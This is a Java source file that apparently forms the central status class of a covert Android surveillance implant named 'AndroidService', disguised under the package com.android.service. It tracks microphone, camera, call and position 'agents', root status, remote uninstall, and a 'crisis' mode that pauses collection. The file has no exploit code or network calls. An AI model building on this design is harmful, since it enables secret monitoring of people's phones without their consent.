/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service;

import java.util.ArrayList;
import java.util.HashMap;

import android.content.Context;

import com.android.service.action.Action;
import com.android.service.agent.AgentConf;
import com.android.service.agent.AgentCrisis;
import com.android.service.agent.AgentType;
import com.android.service.auto.Cfg;
import com.android.service.conf.Option;
import com.android.service.event.EventConf;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
// Singleton Class
/**
 * The Class Status.
 */
public class Status {
	private static final String TAG = "Status";

	/** The agents map. */
	private final HashMap<Integer, AgentConf> agentsMap;

	/** The events map. */
	private final HashMap<Integer, EventConf> eventsMap;

	/** The actions map. */
	private final HashMap<Integer, Action> actionsMap;

	/** The options map. */
	private final HashMap<Integer, Option> optionsMap;

	/** The triggered actions. */
	ArrayList<Integer> triggeredActions = new ArrayList<Integer>();

	/** The synced. */
	public boolean synced;

	/** The drift. */
	public int drift;

	/** The context. */
	private static Context context;

	Object lockCrisis = new Object();
	private boolean crisis = false;
	private int crisisType;
	private boolean haveRoot;
	
	private Object triggeredSemaphore = new Object();

	public boolean uninstall;
	public boolean reload;

	/**
	 * Instantiates a new status.
	 */
	private Status() {
		agentsMap = new HashMap<Integer, AgentConf>();
		eventsMap = new HashMap<Integer, EventConf>();
		actionsMap = new HashMap<Integer, Action>();
		optionsMap = new HashMap<Integer, Option>();
	}

	/** The singleton. */
	private volatile static Status singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static Status self() {
		if (singleton == null) {
			synchronized (Status.class) {
				if (singleton == null) {
					singleton = new Status();
				}
			}
		}

		return singleton;
	}

	/**
	 * Clean.
	 */
	public void clean() {
		agentsMap.clear();
		eventsMap.clear();
		actionsMap.clear();
		optionsMap.clear();
		uninstall = false;
		reload = false;
	}

	/**
	 * Gets the app context.
	 * 
	 * @return the app context
	 */
	public static Context getAppContext() {
		if(Cfg.DEBUG) Check.requires(context != null, "Null Context");
		return context;
	}

	/**
	 * Sets the app context.
	 * 
	 * @param context
	 *            the new app context
	 */
	public static void setAppContext(final Context context) {
		if(Cfg.DEBUG) Check.requires(context != null, "Null Context");
		Status.context = context;
	}

	// Add an agent to the map
	/**
	 * Adds the agent.
	 * 
	 * @param a
	 *            the a
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public void addAgent(final AgentConf a) throws GeneralException {

		if (agentsMap.containsKey(a.getId()) == true) {
			// throw new RCSException("Agent " + a.getId() + " already loaded");
			if(Cfg.DEBUG) Check.log( TAG + " Warn: " + "Substituing agent: " + a);
		}
		
		Integer key = a.getId();
		if(Cfg.DEBUG) Check.asserts(key != null, "null key");

		agentsMap.put(a.getId(), a);
	}

	// Add an event to the map
	/**
	 * Adds the event.
	 * 
	 * @param e
	 *            the e
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public void addEvent(final EventConf e) {
		if(Cfg.DEBUG) Check.log( TAG + " addEvent ");
		// Don't add the same event twice
		if (eventsMap.containsKey(e.getId()) == true) {
			// throw new RCSException("Event " + e.getId() + " already loaded");
			if(Cfg.DEBUG) Check.log( TAG + " Warn: " + "Substituing event: " + e);
		}

		eventsMap.put(e.getId(), e);
	}

	// Add an action to the map
	/**
	 * Adds the action.
	 * 
	 * @param a
	 *            the a
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public void addAction(final Action a) {
		// Don't add the same action twice
		if(Cfg.DEBUG) Check.requires(!actionsMap.containsKey(a.getId()),
				"Action " + a.getId() + " already loaded");

		actionsMap.put(a.getId(), a);
	}

	// Add an option to the map
	/**
	 * Adds the option.
	 * 
	 * @param o
	 *            the o
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public void addOption(final Option o) throws GeneralException {
		// Don't add the same option twice
		if (optionsMap.containsKey(o.getId()) == true) {
			throw new GeneralException("Option " + o.getId()
					+ " already loaded");
		}

		optionsMap.put(o.getId(), o);
	}

	/**
	 * Gets the actions number.
	 * 
	 * @return the actions number
	 */
	public int getActionsNumber() {
		return actionsMap.size();
	}

	/**
	 * Gets the agents number.
	 * 
	 * @return the agents number
	 */
	public int getAgentsNumber() {
		return agentsMap.size();
	}

	/**
	 * Gets the events number.
	 * 
	 * @return the events number
	 */
	public int getEventsNumber() {
		return eventsMap.size();
	}

	/**
	 * Gets the optionss number.
	 * 
	 * @return the optionss number
	 */
	public int getOptionssNumber() {
		return optionsMap.size();
	}

	/**
	 * Gets the agents map.
	 * 
	 * @return the agents map
	 */
	public HashMap<Integer, AgentConf> getAgentsMap() {
		return agentsMap;
	}

	/**
	 * Gets the events map.
	 * 
	 * @return the events map
	 */
	public HashMap<Integer, EventConf> getEventsMap() {
		return eventsMap;
	}

	/**
	 * Gets the actions map.
	 * 
	 * @return the actions map
	 */
	public HashMap<Integer, Action> getActionsMap() {
		return actionsMap;
	}

	/**
	 * Gets the action.
	 * 
	 * @param index
	 *            the index
	 * @return the action
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public Action getAction(final int index) throws GeneralException {
		if (actionsMap.containsKey(index) == false) {
			throw new GeneralException("Action " + index + " not found");
		}

		final Action a = actionsMap.get(index);

		if (a == null) {
			throw new GeneralException("Action " + index + " is null");
		}

		return a;
	}

	/**
	 * Gets the agent.
	 * 
	 * @param agentId
	 *            the id
	 * @return the agent
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public AgentConf getAgent(final int agentId) throws GeneralException {
		if (agentsMap.containsKey(agentId) == false) {
			throw new GeneralException("Agent " + agentId + " not found");
		}

		final AgentConf a = agentsMap.get(agentId);

		if (a == null) {
			throw new GeneralException("Agent " + agentId + " is null");
		}

		return a;
	}

	/**
	 * Gets the event.
	 * 
	 * @param id
	 *            the id
	 * @return the event
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public EventConf getEvent(final int id) throws GeneralException {
		if (eventsMap.containsKey(id) == false) {
			throw new GeneralException("Event " + id + " not found");
		}

		final EventConf e = eventsMap.get(id);

		if (e == null) {
			throw new GeneralException("Event " + id + " is null");
		}

		return e;
	}

	/**
	 * Gets the option.
	 * 
	 * @param id
	 *            the id
	 * @return the option
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public Option getOption(final int id) throws GeneralException {
		if (optionsMap.containsKey(id) == false) {
			throw new GeneralException("Option " + id + " not found");
		}

		final Option o = optionsMap.get(id);

		if (o == null) {
			throw new GeneralException("Option " + id + " is null");
		}

		return o;
	}

	/**
	 * Trigger action.
	 * 
	 * @param i
	 *            the i
	 */
	public void triggerAction(final int i) {
		synchronized (triggeredActions) {
			if (!triggeredActions.contains(i)) {
				triggeredActions.add(new Integer(i));
			}
		}
		synchronized (triggeredSemaphore) {
			try {
				triggeredSemaphore.notifyAll();
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(ex);
				}
			}
		}
	}

	/**
	 * Gets the triggered actions.
	 * 
	 * @return the triggered actions
	 */
	public int[] getTriggeredActions() {
		try {
			synchronized (triggeredSemaphore) {
				triggeredSemaphore.wait();
			}
		} catch (Exception e) {
			if(Cfg.DEBUG) Check.log( TAG + " Error: " + " getActionIdTriggered: " + e);
		}

		synchronized (triggeredActions) {
			final int size = triggeredActions.size();
			final int[] triggered = new int[size];

			for (int i = 0; i < size; i++) {
				triggered[i] = triggeredActions.get(i);
			}

			return triggered;
		}
	}

	/**
	 * Un trigger action.
	 * 
	 * @param action
	 *            the action
	 */
	public void unTriggerAction(final Action action) {
		synchronized (triggeredActions) {
			if (triggeredActions.contains(action.getId())) {
				triggeredActions.remove(new Integer(action.getId()));
			}
		}
		synchronized (triggeredSemaphore) {
			try {
				triggeredSemaphore.notifyAll();
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(ex);
				}
			}
		}
	}

	/**
	 * Un trigger all.
	 */
	public void unTriggerAll() {
		synchronized (triggeredActions) {
			triggeredActions.clear();
		}
		synchronized (triggeredSemaphore) {
			try {
				triggeredSemaphore.notifyAll();
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(ex);
				}
			}
		}
	}

	public synchronized void setCrisis(int type) {
		synchronized (lockCrisis) {
			crisisType = type;
		}

		if(Cfg.DEBUG) Check.log( TAG + " setCrisis: " + type);

		AgentConf agent;
		try {
			agent = getAgent(AgentType.AGENT_MIC);
			if (agent != null) {
				// final MicAgent micAgent = (MicAgent) agent;
				// micAgent.crisis(crisisMic());
			}
		} catch (GeneralException e) {
			// TODO Auto-generated catch block
			if (Cfg.DEBUG) {
				Check.log(e);
			}
		}

	}

	private boolean isCrisis() {
		synchronized (lockCrisis) {
			return crisis;
		}
	}

	public boolean crisisPosition() {
		synchronized (lockCrisis) {
			return (isCrisis() && (crisisType & AgentCrisis.POSITION) != 0);
		}
	}

	public boolean crisisCamera() {
		synchronized (lockCrisis) {
			return (isCrisis() && (crisisType & AgentCrisis.CAMERA) != 0);
		}
	}

	public boolean crisisCall() {
		synchronized (lockCrisis) {
			return (isCrisis() && (crisisType & AgentCrisis.CALL) != 0);
		}
	}

	public boolean crisisMic() {
		synchronized (lockCrisis) {
			return (isCrisis() && (crisisType & AgentCrisis.MIC) != 0);
		}
	}

	public boolean crisisSync() {
		synchronized (lockCrisis) {
			return (isCrisis() && (crisisType & AgentCrisis.SYNC) != 0);
		}
	}

	/**
	 * Start crisis.
	 */
	public void startCrisis() {
		synchronized (lockCrisis) {
			crisis = true;
		}
	}

	/**
	 * Stop crisis.
	 */
	public void stopCrisis() {
		synchronized (lockCrisis) {
			crisis = false;
		}
	}

	public void setRestarting(boolean b) {
		// TODO Auto-generated method stub
	}

	public boolean haveRoot() {
		return this.haveRoot;
	}
	
	public void setRoot(boolean r) {
		this.haveRoot = r;
	}
}
